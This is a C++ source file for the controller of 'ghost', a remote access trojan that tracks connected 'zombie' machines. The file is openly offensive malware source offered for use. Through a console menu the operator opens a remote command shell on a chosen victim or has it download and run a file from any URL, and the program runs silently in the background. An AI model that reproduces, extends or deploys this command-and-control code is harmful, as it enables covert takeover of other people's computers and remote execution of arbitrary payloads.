/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#define					DEFAULT_BUFF	9056
#define					AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger

#define					SHOW_CONSOLE()		{ AllocConsole(); LOG("%s\n\n", c_ascii); b_hidden = false; }
#define					HIDE_CONSOLE()		{ FreeConsole(); b_hidden = true; }
#define					SHOW_MENU()			{ LOG("\nSelect an option: \
\n1) Zombies \
\n2) Configuration \
\n3) Refresh \
\n4) Minimize \
\n5) Exit"); cin >> s_option; \
											}
#define					SHOW_CONFIG()		{	LOG("[COLOR:BROWN]IP: %s", real_ip().c_str()); \
												LOG("[COLOR:BROWN]Port: %s", c_port.c_str()); \
												LOG("-----------------------"); \
											}
#define					SHOW_GHOST()		{ system("CLS"); LOG("%s\n\n", c_ascii); }
#define					GO_BACK()			{ LOG("[COLOR:GREEN]0) [Back to Main Menu]"); }

#define					GHOST_CONFIG		"ghost.conf"

#include				"ahxrwinsock.h"
#include				"ghostlib.h"
#include				"resource.h"
#include				<wininet.h>

using namespace			std;
using namespace			System;

DWORD WINAPI			t_gui(LPVOID params);
DWORD WINAPI			t_window(LPVOID params);
void					onServerClientConnect(SOCKET clientSocket, CLIENTDATA info);
void					refreshClients();
void					onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data);
vector<std::string>		split(const std::string &s, char delim);
string					real_ip();

char *					c_ascii;
DWORD					d_console_id;
bool					b_hidden;
bool					b_gui_active;
bool					b_waiting;
bool					b_ping_wait;
HANDLE					h_gui;
AHXRSERVER				a_server;

#include				"gui.h" // Tray icon.

#pragma comment			(lib, "Wininet.lib")
#pragma comment			(lib, "user32.lib")


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow) 
{
	b_gui_active = true;
	h_gui = CreateThread(0, 0, t_gui, 0, 0, 0);
	CreateThread(0, 0, t_window, 0, 0, 0);

	while (b_gui_active) // This is to prevent this program from closing; but instead, run in the background.
		Sleep(1000);
    return 0;
}

void refreshClients() {
	ghostlib::_clientData	client_data;
	int i_res;

	for (int i = 0; i < ghostlib::getZombieCount(); i++) {
		client_data = ghostlib::getZombieData(i);

		if (client_data.socketRef == INVALID_SOCKET) {
			ghostlib::deleteZombie(i);
			continue;
		}

		/*char buf;
		int err = recv(client_data.socketRef, &buf, 1, MSG_PEEK | MSG_DONTWAIT);
		if (err == SOCKET_ERROR)
			if (WSAGetLastError() != WSAEWOULDBLOCK)
				ghostlib::deleteZombie(i);
		*/
		
		i_res = send(client_data.socketRef, "ghost_ping", 10, 0 ); // Testing if socket is active. Will never respond.

		if (i_res == SOCKET_ERROR)
			ghostlib::deleteZombie(i);
		
	}
}

DWORD WINAPI t_window(LPVOID params) {
	System::Windows::Forms::Application::EnableVisualStyles();
	System::Windows::Forms::Application::SetCompatibleTextRenderingDefault(false);
	server::gui frm;
	System::Windows::Forms::Application::Run(%frm);
	b_gui_active = false;
	return 0;
}

DWORD WINAPI t_gui(LPVOID params) {
	HRSRC			hr_res;
	DWORD32			dw_res;
	LPVOID			lp_res;
	LPVOID			lp_res_lock;
	string 			c_port;
	string			s_option;
	unsigned short	i_option;

	d_console_id = GetCurrentProcessId();
	hr_res = FindResource(NULL, MAKEINTRESOURCE(IDR_HTML1), RT_RCDATA);
	dw_res = ::SizeofResource(NULL, hr_res);
	lp_res = LoadResource(NULL, hr_res);
	lp_res_lock = LockResource(lp_res);
	c_ascii = (char*)lp_res;

	// Creating a new console host for this application specifically. 
	SHOW_CONSOLE();
	freopen("conin$", "r", stdin);
	freopen("conout$", "w", stdout);
	freopen("conout$", "w", stderr);
	HANDLE hstdout = GetStdHandle(STD_OUTPUT_HANDLE);

	// Calibrating the console to ahxrlogger (https://github.com/AHXR/ahxrlogger)
	ahxrlogger_handle(hstdout);

	// Showing the menu and starting the ghost server.
	SHOW_GHOST();

	fstream f_config_file(GHOST_CONFIG, ios::in);

	if (!f_config_file.is_open()) {
		LOG("[COLOR:RED]This process will silently run in the background as \"ghost.exe\". Make sure this port is equal to the port you have sent to the client. Otherwise, data will be sent via email.");
		printf("\nPlease enter your listening port: ");

		cin >> s_option;
		c_port = s_option;
	}
	else {
		f_config_file.seekg(0, f_config_file.end);
		int i_length = (int)f_config_file.tellg();
		f_config_file.seekg(0, f_config_file.beg);

		char * c_buffer = new char[i_length];

		f_config_file.read(c_buffer, i_length);

		c_buffer[i_length] = '\0';
		if (c_buffer[i_length - 1] == '\n')
			c_buffer[i_length - 1] = '\0';

		s_option = c_buffer;
		c_port = s_option;
		f_config_file.close();
	}

	if (!a_server.start_server(s_option.c_str(), TCP_SERVER, onServerClientConnect, onServerRecData)) {
		ERROR("Could not run server... Try again.");
		Sleep(2000);
		exit(EXIT_FAILURE);
	}

	SHOW_GHOST();
	SHOW_CONFIG();

	while (1) {
		while (b_hidden) { Sleep(1000); }
		SHOW_MENU();
		i_option = (unsigned short)atoi(s_option.c_str());

		switch (i_option) {
			case 1: { // Show Zombies
				if (ghostlib::getZombieCount() != 0) {
					SHOW_GHOST();
					LOG("==============[ZOMBIES]==============");

					string					s_output;
					json					j_data;
					System::String ^		sys_data;
					ghostlib::_clientData	client_data = * new ghostlib::_clientData();

					GO_BACK();
					for (int i = 0; i < ghostlib::getZombieCount(); i++) {
						client_data		= ghostlib::getZombieData(i); // Returning a reference to the struct

						j_data			= json::parse(client_data.system_data);
						s_output		= j_data["ID"].get<std::string>() + std::string(" - ") + j_data["IP"].get<std::string>() + std::string(":" + j_data["PORT"].get<std::string>());

						sys_data		= gcnew String(s_output.c_str());
						LOG("%i) %s", i + 1, s_output.c_str());
					}
					while (i_option != 0) {
						cin				>> s_option;
						i_option		= (unsigned short)atoi(s_option.c_str());

						if (i_option == 0)
							break;

						if (i_option > ghostlib::getZombieCount())
							ERROR("That zombie does not exist. Please select a valid zombie from the list...");
						else {
							client_data = ghostlib::getZombieData(i_option - 1);
							j_data		= json::parse(client_data.system_data);

							LOG("\n\nYou have selected \"%s\" (%s:%s)", j_data["ID"].get<std::string>().c_str(), j_data["IP"].get<std::string>().c_str(), j_data["PORT"].get<std::string>().c_str());
							GO_BACK();
							LOG("1) Command Prompt\n2) Download & Execute");

							string				s_menu;
							unsigned short		i_menu = 1;

							while (i_menu != 0) {
								cin >> s_menu;
								i_menu = (unsigned short)atoi(s_menu.c_str());

								switch (i_menu) {
									case 0: break;
									case 1: {
										int i_res = send(client_data.socketRef, "CMD", 3, 0);

										if (i_res == SOCKET_ERROR) {
											ERROR("There was an error attempting to start the command prompt. The zombie has disconnected\n");
											
											ghostlib::deleteZombie(i_option - 1);
											i_menu = 0;

											SHOW_MENU();
										}
										else {
											string s_cmd;
											char * c_cmd = "";

											cin.ignore();
											while (strcmp(c_cmd, "exit") != 0) {
												LOG("\nEnter your command (Type \"exit\" to exit):[COLOR:GREEN]");
												printf("> ");
											
												getline( std::cin, s_cmd );

												c_cmd = const_cast<char *>(s_cmd.c_str());

												if (!strcmp(c_cmd, "exit")) {
													SHOW_MENU();
													i_menu = 0;
													i_option = 0;
													c_cmd = "";
													break;
												}

												int i_res = send(client_data.socketRef, c_cmd, strlen(c_cmd) + 1, 0);
												if (i_res == SOCKET_ERROR) {
													ERROR("There was an error running this command. There is no connection to this zombie.\n");
													SHOW_MENU();
													
													c_cmd = "exit";
													i_menu = 0;
													
													ghostlib::deleteZombie(i_option - 1);
													break;
												}
												else {
													WARNING("Waiting for response....\n");
													b_waiting = true;

													while (b_waiting) Sleep(100);
												}
											}
											send(client_data.socketRef, "CMD", 3, 0);
										}
										break;
									}
									case 2: {
										string s_cmd;
										string s_file;
										char * c_cmd = "";
										char * c_file = "";

										cin.ignore();
										while (strcmp(c_file, "exit") != 0) {
											LOG("\nEnter your URL (Type \"exit\" to exit):[COLOR:GREEN]");
											printf("> ");

											getline(std::cin, s_cmd);

											if (!strcmp(c_cmd, "exit")) {
												i_menu = 0;
												SHOW_MENU();
												break;
											}

											LOG("\nEnter the file name you want it to execute as. Please include the extension as well. (Type \"exit\" to exit):[COLOR:GREEN]");
											printf("> ");

											getline(std::cin, s_file);
											c_file = const_cast<char *>(s_file.c_str());

											if (!strcmp(c_file, "exit")) {
												i_menu = 0;
												SHOW_MENU();
												break;
											}

											json URL_DATA;
											URL_DATA["URL"] = s_cmd;
											URL_DATA["FILE"] = s_file;

											int i_res = send(client_data.socketRef, URL_DATA.dump().c_str(), strlen(URL_DATA.dump().c_str()) + 1, 0);
											if (i_res == SOCKET_ERROR) {
												ERROR("There was an error running this. There is no connection to this zombie.\n");
												SHOW_MENU();

												c_cmd = "exit";
												i_menu = 0;

												ghostlib::deleteZombie(i_option - 1);
												break;
											}
											else {
												WARNING("Downloading, please wait....\n");
												b_waiting = true;

												while (b_waiting) Sleep(100);

												c_cmd = "exit";
												i_menu = 0;
												SHOW_MENU();
											}
										}
										break;
									}
									default: {
										ERROR("Invalid command. Try again.");
										break;
									}
								}
							}
							break;
						}
					}
				}
				else {
					ERROR("There are no zombies connected.");
				}
				break;
			}
			case 2: { // Configuration
				SHOW_GHOST();
				SHOW_CONFIG();

				char s_save = ' ';
				cin.ignore();
				while (s_save != 'y' && s_save != 'n') {
					LOG("Would you like to save this config to a file so you can instantly run this server in the future? (y/n)");
					cin >> s_save;
				}

				if (s_save == 'y') {
					fstream f_save(GHOST_CONFIG, ios::out);
					f_save << c_port;
					f_save.close();

					LOG("[COLOR:BROWN]Configuration file saved as %s", GHOST_CONFIG);
				}
				break;
			}
			case 3: { // Refresh
				WARNING("Refreshing clients... Please wait.");
				refreshClients();
				LOG("Done.");
				break;
			}
			case 4: { // Minimize
				HIDE_CONSOLE();
				break;
			}
			case 5: { // Exit
				exit(EXIT_SUCCESS);
				break;
			}
		}
	}
	return 0;
}

void onServerClientConnect(SOCKET clientSocket, CLIENTDATA info) {
	server::gui::taskbarIcon->BalloonTipText = L"A new zombie has connected!";
	server::gui::taskbarIcon->ShowBalloonTip(2000);
}

void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
	string s_data = data;

	if (b_waiting) {
		LOG("[RESPONSE]\n%s", data);

		server::gui::taskbarIcon->BalloonTipText = L"You have received a response from your zombie.";
		server::gui::taskbarIcon->ShowBalloonTip(2000);

		b_waiting = false;
	}
	else {
		int	i_zombie_idx;

		ghostlib::addZombie(ghostlib::_clientData{ clientSocket, info });
		i_zombie_idx = ghostlib::getZombieIndex(clientSocket);
		ghostlib::parseZombie(clientSocket, i_zombie_idx, data);
	}
}

template<typename Out>
void split(const std::string &s, char delim, Out result) {
	std::stringstream ss(s);
	std::string item;
	while (std::getline(ss, item, delim)) {
		*(result++) = item;
	}
}

vector<std::string> split(const std::string &s, char delim) {
	std::vector<std::string> elems;
	split(s, delim, std::back_inserter(elems));
	return elems;
}

string real_ip() {

	HINTERNET net = InternetOpen("--",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET conn = InternetOpenUrl(net,
		"https://api.ipify.org/",
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	char buffer[4096];
	DWORD read;

	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
	InternetCloseHandle(net);

	return std::string(buffer, read);
}